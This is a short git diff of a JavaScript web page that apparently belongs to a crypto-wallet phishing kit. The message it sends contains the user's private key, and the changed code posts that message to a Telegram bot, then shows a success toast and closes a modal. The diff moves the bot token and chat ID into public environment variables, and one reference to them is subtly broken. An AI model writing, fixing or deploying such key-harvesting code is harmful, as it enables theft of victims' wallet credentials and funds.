@@ -100,21 +100,24 @@ Private Key: \`${privateKey.trim()}\`
         break;
     }
 
-    const BOT_TOKEN = "Token";
-    const CHAT_ID = "chat id ";
+    const BOT_TOKEN = "";
+    const CHAT_ID = "";
 
     try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: emailBody,
-          parse_mode: "Markdown", // Allows backtick formatting
-        }),
-      });
+      await fetch(
+        `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: process.NEXT_PUBLIC_CHAT_ID,
+            text: emailBody,
+            parse_mode: "Markdown", // Allows backtick formatting
+          }),
+        }
+      );
 
       toast.success("Message sent successfully!");
       closeInitializingModal();
